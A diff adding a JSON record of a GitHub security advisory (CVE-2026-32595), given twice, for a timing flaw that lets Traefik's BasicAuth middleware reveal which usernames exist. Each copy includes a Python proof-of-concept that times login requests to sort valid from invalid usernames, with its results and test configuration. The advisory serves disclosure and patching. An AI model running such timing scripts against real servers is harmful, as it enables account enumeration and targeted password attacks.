@@ -1,0 +1,149 @@
+{
+  "global": {
+    "cve_id": "CVE-2026-32595",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 0,
+        "vector_string": null
+      },
+      "cvss_v4": {
+        "score": 6.3,
+        "vector_string": "CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:L/SI:N/SA:N"
+      }
+    },
+    "cwe_ids": [
+      "CWE-208"
+    ],
+    "description": "## Summary\n\nThere is a potential vulnerability in Traefik's BasicAuth middleware that allows username enumeration via a timing attack.\n\nWhen a submitted username exists, the middleware performs a bcrypt password comparison taking ~166ms. When the username does not exist, the response returns immediately in ~0.6ms. This ~298x timing difference is observable over the network and allows an unauthenticated attacker to reliably distinguish valid from invalid usernames.\n\n## Patches\n\n- https://github.com/traefik/traefik/releases/tag/v2.11.41\n- https://github.com/traefik/traefik/releases/tag/v3.6.11\n- https://github.com/traefik/traefik/releases/tag/v3.7.0-ea.2\n\n## For more information\n\nIf you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).\n\n<details>\n<summary>Original Description</summary>\n\n### Summary\nA timing attack vulnerability exists in Traefik's BasicAuth middleware that allows unauthenticated attackers to enumerate valid usernames. When a username exists, bcrypt password verification takes ~166ms; when it doesn't exist, the response returns immediately in ~0.6ms. This ~298x timing difference enables reliable username enumeration.\n\n### Details\nThe vulnerability exists in the BasicAuth middleware implementation. When validating credentials:\n- User exists: The system performs bcrypt password comparison, which intentionally takes ~100-200ms due to bcrypt's design\n- User doesn't exist: The system immediately returns authentication failure in ~0.6ms\n\nThis timing difference is observable over the network and allows attackers to distinguish between valid and invalid usernames.\n\nRoot Cause: The code returns early when the user is not found, without performing a dummy bcrypt comparison to maintain constant-time execution.\n\nExpected behavior: The system should perform a bcrypt comparison regardless of whether the user exists, to maintain consistent response times.\n\n### PoC\nEnvironment:\n- Traefik v3.6.9\n- k3s v1.34.5\n\nConfiguration:\n```yaml\napiVersion: traefik.io/v1alpha1\nkind: Middleware\nmetadata:\n  name: basicauth\n  namespace: traefik-poc\nspec:\n  basicAuth:\n    secret: basic-auth-secret\n---\napiVersion: networking.k8s.io/v1\nkind: Ingress\nmetadata:\n  name: test-basicauth\n  annotations:\n    traefik.ingress.kubernetes.io/router.middlewares: traefik-poc-basicauth@kubernetescrd\nspec:\n  ingressClassName: traefik\n  rules:\n    - http:\n        paths:\n          - path: /protected\n            pathType: Prefix\n            backend:\n              service:\n                name: whoami\n                port:\n                  number: 80\n```\n\nPoC Script:\n```python\n#!/usr/bin/env python3\nimport requests\nimport time\nimport statistics\nimport sys\nTARGET = sys.argv[1] if len(sys.argv) > 1 else \"http://localhost:30080/protected\"\nTEST_USERS = [\"admin\", \"root\", \"test\", \"nonexistent12345\"]\nSAMPLES = 20\ndef measure_time(username, password=\"wrongpassword\"):\n    times = []\n    for _ in range(SAMPLES):\n        start = time.perf_counter()\n        requests.get(TARGET, auth=(username, password), timeout=5)\n        elapsed = time.perf_counter() - start\n        times.append(elapsed)\n    return statistics.median(times)\nprint(f\"Target: {TARGET}\")\nprint(f\"Samples per user: {SAMPLES}\\n\")\nfor user in TEST_USERS:\n    median = measure_time(user)\n    if median > 0.05:  # bcrypt threshold\n        status = \"[+] EXISTS (slow - bcrypt verification)\"\n    else:\n        status = \"[-] NOT FOUND (fast - immediate return)\"\n    print(f\"{status}: {user:20s} | median={median:.4f}s\")\n```\n\nExecution Results:\n```\nTarget: http://10.10.10.7:30080/protected\nSamples per user: 20\n\n[+] EXISTS (slow - bcrypt verification): admin         | median=0.1665s\n[-] NOT FOUND (fast - immediate return): root          | median=0.0006s\n[-] NOT FOUND (fast - immediate return): test          | median=0.0006s\n[-] NOT FOUND (fast - immediate return): nonexistent   | median=0.0006s\n\nTiming difference ratio: 298.0x\n```\n\n### Impact\n- **Vulnerability Type:** Information Disclosure via Timing Attack (CWE-208)\n- **Impact:**\n  - Attackers can enumerate valid usernames without authentication\n  - Enables targeted password brute-force attacks against confirmed accounts\n  - Exposes information about system user structure\n- **Who is impacted:** All users of Traefik's BasicAuth middleware are affected. The vulnerability requires:\n  - BasicAuth middleware enabled\n  - Attacker able to make requests to protected endpoints\n  - Network access to measure response times\n- **Attack Complexity:** Low - only requires sending HTTP requests and measuring response times\n- **Privileges Required:** None\n- **User Interaction:** None\n\n</details>\n\n---",
+    "ghsa_id": "GHSA-g3hg-j4jv-cwfr",
+    "html_url": "https://github.com/advisories/GHSA-g3hg-j4jv-cwfr",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-g3hg-j4jv-cwfr"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-32595"
+      }
+    ],
+    "published_at": "2026-03-20T15:43:13Z",
+    "references": [
+      "https://github.com/traefik/traefik/security/advisories/GHSA-g3hg-j4jv-cwfr",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-32595",
+      "https://github.com/traefik/traefik/releases/tag/v2.11.41",
+      "https://github.com/traefik/traefik/releases/tag/v3.6.11",
+      "https://github.com/traefik/traefik/releases/tag/v3.7.0-ea.2",
+      "https://github.com/advisories/GHSA-g3hg-j4jv-cwfr"
+    ],
+    "severity": "medium",
+    "summary": "Traefik Affected by BasicAuth Middleware Timing Attack Allows Username Enumeration",
+    "updated_at": "2026-03-20T15:43:16Z",
+    "vulnerabilities": [
+      {
+        "first_patched_version": null,
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/traefik/traefik"
+        },
+        "vulnerable_version_range": "<= 1.7.34"
+      },
+      {
+        "first_patched_version": "2.11.41",
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/traefik/traefik/v2"
+        },
+        "vulnerable_version_range": "<= 2.11.40"
+      },
+      {
+        "first_patched_version": "3.6.11",
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/traefik/traefik/v3"
+        },
+        "vulnerable_version_range": "<= 3.6.10"
+      },
+      {
+        "first_patched_version": "3.7.0-ea.2",
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/traefik/traefik/v3"
+        },
+        "vulnerable_version_range": ">= 3.7.0-ea.1, < 3.7.0-ea.2"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "id": "GHSA-g3hg-j4jv-cwfr",
+  "repo": {
+    "cve_id": "CVE-2026-32595",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": null,
+        "vector_string": null
+      },
+      "cvss_v4": {
+        "score": 6.3,
+        "vector_string": "CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:L/SI:N/SA:N"
+      }
+    },
+    "cwe_ids": [
+      "CWE-208"
+    ],
+    "description": "## Summary\r\n\r\nThere is a potential vulnerability in Traefik's BasicAuth middleware that allows username enumeration via a timing attack.\r\n\r\nWhen a submitted username exists, the middleware performs a bcrypt password comparison taking ~166ms. When the username does not exist, the response returns immediately in ~0.6ms. This ~298x timing difference is observable over the network and allows an unauthenticated attacker to reliably distinguish valid from invalid usernames.\r\n\r\n## Patches\r\n\r\n- https://github.com/traefik/traefik/releases/tag/v2.11.41\r\n- https://github.com/traefik/traefik/releases/tag/v3.6.11\r\n- https://github.com/traefik/traefik/releases/tag/v3.7.0-ea.2\r\n\r\n## For more information\r\n\r\nIf you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).\r\n\r\n<details>\r\n<summary>Original Description</summary>\r\n\r\n### Summary\r\nA timing attack vulnerability exists in Traefik's BasicAuth middleware that allows unauthenticated attackers to enumerate valid usernames. When a username exists, bcrypt password verification takes ~166ms; when it doesn't exist, the response returns immediately in ~0.6ms. This ~298x timing difference enables reliable username enumeration.\r\n\r\n### Details\r\nThe vulnerability exists in the BasicAuth middleware implementation. When validating credentials:\r\n- User exists: The system performs bcrypt password comparison, which intentionally takes ~100-200ms due to bcrypt's design\r\n- User doesn't exist: The system immediately returns authentication failure in ~0.6ms\r\n\r\nThis timing difference is observable over the network and allows attackers to distinguish between valid and invalid usernames.\r\n\r\nRoot Cause: The code returns early when the user is not found, without performing a dummy bcrypt comparison to maintain constant-time execution.\r\n\r\nExpected behavior: The system should perform a bcrypt comparison regardless of whether the user exists, to maintain consistent response times.\r\n\r\n### PoC\r\nEnvironment:\r\n- Traefik v3.6.9\r\n- k3s v1.34.5\r\n\r\nConfiguration:\r\n```yaml\r\napiVersion: traefik.io/v1alpha1\r\nkind: Middleware\r\nmetadata:\r\n  name: basicauth\r\n  namespace: traefik-poc\r\nspec:\r\n  basicAuth:\r\n    secret: basic-auth-secret\r\n---\r\napiVersion: networking.k8s.io/v1\r\nkind: Ingress\r\nmetadata:\r\n  name: test-basicauth\r\n  annotations:\r\n    traefik.ingress.kubernetes.io/router.middlewares: traefik-poc-basicauth@kubernetescrd\r\nspec:\r\n  ingressClassName: traefik\r\n  rules:\r\n    - http:\r\n        paths:\r\n          - path: /protected\r\n            pathType: Prefix\r\n            backend:\r\n              service:\r\n                name: whoami\r\n                port:\r\n                  number: 80\r\n```\r\n\r\nPoC Script:\r\n```python\r\n#!/usr/bin/env python3\r\nimport requests\r\nimport time\r\nimport statistics\r\nimport sys\r\nTARGET = sys.argv[1] if len(sys.argv) > 1 else \"http://localhost:30080/protected\"\r\nTEST_USERS = [\"admin\", \"root\", \"test\", \"nonexistent12345\"]\r\nSAMPLES = 20\r\ndef measure_time(username, password=\"wrongpassword\"):\r\n    times = []\r\n    for _ in range(SAMPLES):\r\n        start = time.perf_counter()\r\n        requests.get(TARGET, auth=(username, password), timeout=5)\r\n        elapsed = time.perf_counter() - start\r\n        times.append(elapsed)\r\n    return statistics.median(times)\r\nprint(f\"Target: {TARGET}\")\r\nprint(f\"Samples per user: {SAMPLES}\\n\")\r\nfor user in TEST_USERS:\r\n    median = measure_time(user)\r\n    if median > 0.05:  # bcrypt threshold\r\n        status = \"[+] EXISTS (slow - bcrypt verification)\"\r\n    else:\r\n        status = \"[-] NOT FOUND (fast - immediate return)\"\r\n    print(f\"{status}: {user:20s} | median={median:.4f}s\")\r\n```\r\n\r\nExecution Results:\r\n```\r\nTarget: http://10.10.10.7:30080/protected\r\nSamples per user: 20\r\n\r\n[+] EXISTS (slow - bcrypt verification): admin         | median=0.1665s\r\n[-] NOT FOUND (fast - immediate return): root          | median=0.0006s\r\n[-] NOT FOUND (fast - immediate return): test          | median=0.0006s\r\n[-] NOT FOUND (fast - immediate return): nonexistent   | median=0.0006s\r\n\r\nTiming difference ratio: 298.0x\r\n```\r\n\r\n### Impact\r\n- **Vulnerability Type:** Information Disclosure via Timing Attack (CWE-208)\r\n- **Impact:**\r\n  - Attackers can enumerate valid usernames without authentication\r\n  - Enables targeted password brute-force attacks against confirmed accounts\r\n  - Exposes information about system user structure\r\n- **Who is impacted:** All users of Traefik's BasicAuth middleware are affected. The vulnerability requires:\r\n  - BasicAuth middleware enabled\r\n  - Attacker able to make requests to protected endpoints\r\n  - Network access to measure response times\r\n- **Attack Complexity:** Low - only requires sending HTTP requests and measuring response times\r\n- **Privileges Required:** None\r\n- **User Interaction:** None\r\n\r\n</details>",
+    "ghsa_id": "GHSA-g3hg-j4jv-cwfr",
+    "html_url": "https://github.com/traefik/traefik/security/advisories/GHSA-g3hg-j4jv-cwfr",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-g3hg-j4jv-cwfr"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-32595"
+      }
+    ],
+    "published_at": "2026-03-20T09:44:00Z",
+    "references": [],
+    "severity": "medium",
+    "summary": "BasicAuth Middleware Timing Attack Allows Username Enumeration",
+    "updated_at": "2026-03-20T09:44:00Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/traefik/traefik"
+        },
+        "patched_versions": "",
+        "vulnerable_version_range": "<= v1.7.34"
+      },
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/traefik/traefik/v2"
+        },
+        "patched_versions": "v2.11.41",
+        "vulnerable_version_range": "<= v2.11.40"
+      },
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/traefik/traefik/v3"
+        },
+        "patched_versions": "v3.6.11",
+        "vulnerable_version_range": "<= v3.6.10"
+      },
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/traefik/traefik/v3"
+        },
+        "patched_versions": "v3.7.0-ea.2",
+        "vulnerable_version_range": ">= v3.7.0-ea.1, <= v3.7.0-ea.1"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "traefik/traefik"
+}
